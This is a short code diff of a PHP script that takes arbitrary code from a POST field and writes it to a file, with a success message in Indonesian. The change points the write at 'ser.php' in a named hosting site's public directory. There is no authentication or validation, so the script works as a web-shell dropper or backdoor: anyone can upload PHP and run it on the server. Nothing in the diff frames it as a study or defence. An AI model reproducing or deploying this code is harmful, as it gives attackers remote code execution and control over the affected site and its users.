@@ -6,7 +6,7 @@
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     $code = $_POST['code'] ?? '';
     if (!empty($code)) {
-        $file = __DIR__ . '/myscript.php';
+        $file = __DIR__ . '/var/www/vhosts/thaiecvr.com/epcinter.co.th/_newfinal_/public/ser.php';
         file_put_contents($file, $code);
         echo "✅ File berhasil disimpan: $file";
     }
